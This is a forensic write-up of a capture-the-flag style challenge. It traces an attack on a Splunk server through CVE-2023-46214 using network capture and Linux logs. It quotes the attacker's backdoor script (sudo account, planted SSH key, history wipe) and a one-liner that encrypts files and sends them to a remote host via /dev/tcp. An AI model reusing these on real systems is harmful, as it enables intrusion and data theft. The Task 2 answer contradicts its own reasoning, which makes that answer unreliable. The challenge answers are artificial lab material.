# Fragility

#linux #wireshark #dfir #log_analysis 
## Description

In the monitoring team at our company, each member has access to Splunk web UI using an admin Splunk account. Among them, John has full control over the machine that hosts the entire Splunk system. One day, he panicked and reported to us that an important file on his computer had disappeared. Moreover, he also discovered a new account on the login screen. Suspecting this to be the result of an attack, we proceeded to collect some evidence from his computer and also obtained network capture. Can you help us investigate it?
## Files

```powershell
➜ 7z x .\fragility.zip -o"fragility" -p"hacktheblue"
➜ ls

    Directory: ~\VBoxShare\fragility

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d----          26.06.2024    17:27                [root]
-----          15.04.2024    01:35         330196 capture.pcapng
-----          15.04.2024    01:58     1546908444 Challenge.7z
```

We are given `pcap` file and a filesystem for the investigation.

Only valid folders from filesystem is `var`, `root`, `proc`, `opt`. Anything else is empty files.

![Writeup-4.png](/assets/soc/sherlocks/fragility/Writeup-4.png)

## Tasks

### Task 1. What CVE did the attacker use to exploit the vulnerability?

Logically first we should take a look at network traffic to identify how the attacker got into the system.

![Writeup.png](/assets/soc/sherlocks/fragility/Writeup.png)

For HTTP we see unusual traffic, `python` script seems to be authenticating on the server as `John` (admin). We can suspect that this wasn't attacker, rather monitoring script doing automated task with `John`'s credentials.

![Writeup-1.png](/assets/soc/sherlocks/fragility/Writeup-1.png)

In the last POST request the user enters odd search query which starts with `runshellscript`

![Writeup-2.png](/assets/soc/sherlocks/fragility/Writeup-2.png)

Splunk CVEs: [https://advisory.splunk.com/advisories](https://advisory.splunk.com/advisories)
\| [SVD-2023-0806](https://advisory.splunk.com/advisories/SVD-2023-0806) \| 2023-08-30 \| [Absolute Path Traversal in Splunk Enterprise Using runshellscript.py](https://advisory.splunk.com/advisories/SVD-2023-0806)\ | High\ | [CVE-2023-40597](https://www.cve.org/CVERecord?id=CVE-2023-40597) \|

The [CVE-2023-40597](https://www.cve.org/CVERecord?id=CVE-2023-40597) particularly stands out as an attack vector which attackers used, but this CVE would have been last part of the chain.

Before this CVE we can we XML document uploaded with XXE payload.

[SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104) \| 2023-11-16 \| [Remote code execution (RCE) in Splunk Enterprise through Insecure XML Parsing](https://advisory.splunk.com/advisories/SVD-2023-1104) \| High \| [CVE-2023-46214](https://www.cve.org/CVERecord?id=CVE-2023-46214)

![Writeup-3.png](/assets/soc/sherlocks/fragility/Writeup-3.png)

::: tip :bulb: Answer
`CVE-2023-46214`
:::

### Task 2. What MITRE technique does the attacker use to maintain persistence?

```xml
<xsl:text>
	#!/bin/bash
	adduser --shell /bin/bash --gecos nginx --quiet --disabled-password --home /var/www/ nginx
	access=$(echo MzlhNmJiZTY0NTYzLTY3MDktOTNhNC1hOWYzLTJjZTc4Mjhm | base64 -d | rev)
	echo "nginx:$access" | chpasswd
	usermod -aG sudo nginx
	mkdir /var/www/.ssh
	echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKoougbBG5oQuAQWW2JcHY/ZN49jmeegLqgVlimxv42SfFXcuRgUoyostBB6HnHB5lKxjrBmG/183q1AWn6HBmHpbzjZZqKwSfKgap34COp9b+E9oIgsu12lA1I7TpOw1S6AE71d4iPj5pFFxpUbSG7zJaQ2CAh1qK/0RXioZYbEGYDKVQc7ivd1TBvt0puoogWxllsCUTlJxyQXg2OcDA/8enLh+8UFKIvZy4Ylr4zNY4DyHmwVDL06hcjTfCP4T/JWHf8ShEld15gjuF1hZXOuQY4qwit/oYRN789mq2Ke+Azp0wEo/wTNHeY9OSQOn04zGQH/bLfnjJuq1KQYUUHRCE1CXjUt4cxazQHnNeVWlGOn5Dklb/CwkIcarX4cYQM36rqMusTPPvaGmIbcWiXw9J3ax/QB2DR3dF31znW4g5vHjYYrFeKmcZU1+DCUx075nJEVjy+QDTMQvRXW9Jev6OApHVLZc6Lx8nNm8c6X6s4qBSu8EcLLWYFWIwxqE= support@nginx.org" > /var/www/.ssh/authorized_keys
	chown -R nginx:nginx /var/www/
	cat /dev/null > /root/.bash_history
</xsl:text>
```

The adversaries added `nginx` user to system, with `sudo` group. Established SSH persistence and deleted their tracks.

[T1136](https://attack.mitre.org/techniques/T1136) \| [Create Account](https://attack.mitre.org/techniques/T1136) \| Adversaries may create an account to maintain access to victim systems. With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.

For persistence they used new account so `T1136` fits the MITRE technique.

::: tip :bulb: Answer
`T1336`
:::

### Task 3. John has adjusted the timezone but hasn't rebooted the computer yet, which has led to some things either being updated or not updated with the new timezone. Identifying the timezone can assist you further in your investigation. What was the default timezone and the timezone after John's adjustment on this machine?

Since `/etc` directory is virtually empty we have to look at other files.  

`/var/log/syslog` and `/var/log/messages` store all global system activity data, including startup messages. Debian-based systems like Ubuntu store this in /`var/log/syslog`, while Red Hat-based systems like `RHEL` or `CentOS` use `/var/log/messages`.

The journal is a component of systemd. It's **a centralized location for all messages logged by different components in a systemd-enabled Linux system**. This includes kernel and boot messages, messages coming from syslog, or different services. [src](https://www.loggly.com/ultimate-guide/linux-logging-with-systemd)

```bash
└─$ cat syslog | grep timedate -i
Apr 13 23:24:56 ubuntu dbus-daemon[638]: [system] Activating via systemd: service name='org.freedesktop.timedate1' unit='dbus-org.freedesktop.timedate1.service' requested by ':1.113' (uid=0 pid=5827 comm="timedatectl set-timezone Asia/Ho_Chi_Minh " label="unconfined")
Apr 13 23:24:56 ubuntu dbus-daemon[638]: [system] Successfully activated service 'org.freedesktop.timedate1'
Apr 13 23:24:56 ubuntu systemd-timedated[5828]: Changed time zone to 'Asia/Ho_Chi_Minh' (+07).
Apr 13 23:25:26 ubuntu systemd[1]: systemd-timedated.service: Succeeded.

└─$ strings * | grep -in timezone
11742:MESSAGE=[system] Activating via systemd: service name='org.freedesktop.timedate1' unit='dbus-org.freedesktop.timedate1.service' requested by ':1.113' (uid=0 pid=5827 comm="timedatectl set-timezone Asia/Ho_Chi_Minh " label="unconfined")
11766:CODE_FUNC=method_set_timezone
11769:TIMEZONE=Asia/Ho_Chi_Minh
11770:TIMEZONE
11771:TIMEZONE_SHORTNAME=+07
11772:TIMEZONE_SHORTNAME
└─$ grep 'GMT' syslog -in
3076:Apr 13 23:21:30 ubuntu gnome-shell[4904]: GNOME Shell started at Sat Apr 13 2024 23:21:22 GMT-0700 (PDT)
```

::: tip :bulb: Answer
`UTC-07/UTC+07`
:::

### Task 4. When did the attacker SSH in? (UTC)

**/var/log/auth.log** or **/var/log/secure**: Keep authentication logs for both successful or failed logins, and authentication processes. Storage depends on system type. For Debian/Ubuntu, look in /var/log/auth.log. For Redhat/CentOS, go to /var/log/secure. [src](https://www.plesk.com/blog/featured/linux-logs-explained/)

```bash
└─$ grep sshd auth.log | bat
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ STDIN
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Apr 14 07:58:34 ubuntu useradd[11091]: new user: name=sshd, UID=126, GID=65534, home=/run/sshd, shell=/usr/sbin/nologin, from=none
   2   │ Apr 14 07:58:34 ubuntu usermod[11099]: change user 'sshd' password
   3   │ Apr 14 07:58:34 ubuntu chage[11106]: changed password expiry for sshd
   4   │ Apr 14 07:58:36 ubuntu sshd[11238]: Server listening on 0.0.0.0 port 22.
   5   │ Apr 14 07:58:36 ubuntu sshd[11238]: Server listening on :: port 22.
   6   │ Apr 14 08:00:21 ubuntu sshd[13461]: Accepted publickey for nginx from 192.168.222.130 port 43302 ssh2: RSA SHA256:zRdVnxnRPJ37HDm5KkRvQbklvc2PfFL3av8W1Jb6QoE
   7   │ Apr 14 08:00:21 ubuntu sshd[13461]: pam_unix(sshd:session): session opened for user nginx by (uid=0)
   8   │ Apr 14 08:03:08 ubuntu sshd[13702]: Received disconnect from 192.168.222.130 port 43302:11: disconnected by user
   9   │ Apr 14 08:03:08 ubuntu sshd[13702]: Disconnected from user nginx 192.168.222.130 port 43302
  10   │ Apr 14 08:03:08 ubuntu sshd[13461]: pam_unix(sshd:session): session closed for user nginx
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

`nginx` user makes first connection on `Apr 14 08:00:21`, but we need UTC so +7 hours.

> `04-14 15:00:21`

### Task 5. How much time has passed from when the user was first created to when the attacker stopped using SSH?

```bash
└─$ grep nginx auth.log | bat
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ STDIN
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Apr 14 08:00:13 ubuntu groupadd[13358]: group added to /etc/group: name=nginx, GID=1002
   2   │ Apr 14 08:00:13 ubuntu groupadd[13358]: group added to /etc/gshadow: name=nginx
   3   │ Apr 14 08:00:13 ubuntu groupadd[13358]: new group: name=nginx, GID=1002
   4   │ Apr 14 08:00:13 ubuntu useradd[13364]: new user: name=nginx, UID=1002, GID=1002, home=/var/www/, shell=/bin/bash, from=none
   5   │ Apr 14 08:00:13 ubuntu usermod[13376]: change user 'nginx' password
   6   │ Apr 14 08:00:13 ubuntu chfn[13383]: changed user 'nginx' information
   7   │ Apr 14 08:00:13 ubuntu chpasswd[13394]: pam_unix(chpasswd:chauthtok): password changed for nginx
   8   │ Apr 14 08:00:13 ubuntu usermod[13397]: add 'nginx' to group 'sudo'
   9   │ Apr 14 08:00:13 ubuntu usermod[13397]: add 'nginx' to shadow group 'sudo'
  10   │ Apr 14 08:00:21 ubuntu sshd[13461]: Accepted publickey for nginx from 192.168.222.130 port 43302 ssh2: RSA SHA256:zRdVnxnRPJ37HDm5KkRvQbklvc2PfFL3av8W1Jb6QoE
  11   │ Apr 14 08:00:21 ubuntu sshd[13461]: pam_unix(sshd:session): session opened for user nginx by (uid=0)
  12   │ Apr 14 08:00:21 ubuntu systemd-logind[673]: New session 7 of user nginx.
  13   │ Apr 14 08:00:22 ubuntu systemd: pam_unix(systemd-user:session): session opened for user nginx by (uid=0)
  14   │ Apr 14 08:00:54 ubuntu sudo:    nginx : TTY=pts/2 ; PWD=/opt/splunk/bin/scripts ; USER=root ; COMMAND=/usr/bin/rm -rf search.sh
  15   │ Apr 14 08:00:54 ubuntu sudo: pam_unix(sudo:session): session opened for user root by nginx(uid=0)
  16   │ Apr 14 08:00:59 ubuntu sudo:    nginx : TTY=pts/2 ; PWD=/opt/splunk/bin/scripts ; USER=root ; COMMAND=/usr/bin/su
  17   │ Apr 14 08:00:59 ubuntu sudo: pam_unix(sudo:session): session opened for user root by nginx(uid=0)
  18   │ Apr 14 08:00:59 ubuntu su: (to root) nginx on pts/2
  19   │ Apr 14 08:00:59 ubuntu su: pam_unix(su:session): session opened for user root by nginx(uid=0)
  20   │ Apr 14 08:02:21 ubuntu sudo:    nginx : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/mv /home/johnnycage/Documents/Important.pdf .
  21   │ Apr 14 08:02:21 ubuntu sudo: pam_unix(sudo:session): session opened for user root by nginx(uid=0)
  22   │ Apr 14 08:02:54 ubuntu sudo:    nginx : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/openssl enc -aes-256-cbc -iv 4fa17640b7dfe8799f072c65b15f581d -K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d -in data.zip
  23   │ Apr 14 08:02:54 ubuntu sudo: pam_unix(sudo:session): session opened for user root by nginx(uid=0)
  24   │ Apr 14 08:03:01 ubuntu sudo:    nginx : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/rm -rf data.zip Important.pdf
  25   │ Apr 14 08:03:01 ubuntu sudo: pam_unix(sudo:session): session opened for user root by nginx(uid=0)
  26   │ Apr 14 08:03:08 ubuntu sshd[13702]: Disconnected from user nginx 192.168.222.130 port 43302
  27   │ Apr 14 08:03:08 ubuntu sshd[13461]: pam_unix(sshd:session): session closed for user nginx
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

```bash
Apr 14 08:00:13 ubuntu useradd[13364]: new user: name=nginx, UID=1002, GID=1002, home=/var/www/, shell=/bin/bash, from=none
...
Apr 14 08:03:08 ubuntu sshd[13702]: Disconnected from user nginx 192.168.222.130 port 43302
```

```python
>>> from datetime import datetime as dt
>>> t1 = dt(1,2,3, 8,0,13) # Note: We dont care about y/m/d
>>> t2 = dt(1,2,3, 8,3,8 )
>>> str(t2 - t1)
'0:02:55' # Note: Answer needs 2 digits values
```

::: tip :bulb: Answer
`00:02:55`
:::

### Task 6. What is the password for the account that the attacker used to backdoor?

In the detection phase (XXE injection) the user password was added in an obfuscate manner:
```bash
access=$(echo MzlhNmJiZTY0NTYzLTY3MDktOTNhNC1hOWYzLTJjZTc4Mjhm | base64 -d | rev)
-
f8287ec2-3f9a-4a39-9076-36546ebb6a93
```

::: tip :bulb: Answer
`f8287ec2-3f9a-4a39-9076-36546ebb6a93`
:::

### Task 7. There is a secret in the exfiltrated file, what is its content?

```bash
┌──(woyag㉿kraken)-[/media/…/Challenge/[root]/var/www]
└─$ cat .bash_history
...
sudo mv /home/johnnycage/Documents/Important.pdf .
...
zip data.zip *
...
sudo openssl enc -aes-256-cbc -iv $(cut -c 1-32 <<< $(uname -r | md5sum)) -K $(cut -c 1-64 <<< $(date +%s | sha256sum)) -in data.zip | base64 | dd conv=ebcdic > /dev/tcp/192.168.222.130/8080
sudo rm -rf *
....
```

Data is exfiltrated to remote server: `ip.dst == 192.168.222.130 and tcp.dstport == 8080`, but it's encrypted.

![Writeup-5.png](/assets/soc/sherlocks/fragility/Writeup-5.png)

Follow conversation and extract stream:

![Writeup-6.png](/assets/soc/sherlocks/fragility/Writeup-6.png)

`EBCDIC` wasn't valid or something so I exported the data as `raw` again and started cooking:

![Writeup-7.png](/assets/soc/sherlocks/fragility/Writeup-7.png)

We know KEY/IV from `auth.log`:
```bash
Apr 14 08:02:54 ubuntu sudo:    nginx : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/openssl enc -aes-256-cbc -iv 4fa17640b7dfe8799f072c65b15f581d -K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d -in data.zip
```

Unzip and view contents.

![Writeup-8.png](/assets/soc/sherlocks/fragility/Writeup-8.png)

::: tip :bulb: Answer
`Th3_uNs33n_P4$$w0rd_is_th3_m05t_s3cur3`
:::

### Task 8. What are the username and password that the attacker uses to access Splunk?

The only valid credentials we saw during HTTP traffic analysis was John's, that must have been the entry point for attackers.

::: tip :bulb: Answer
`johnnyC:h3Re15j0hnNy`
:::
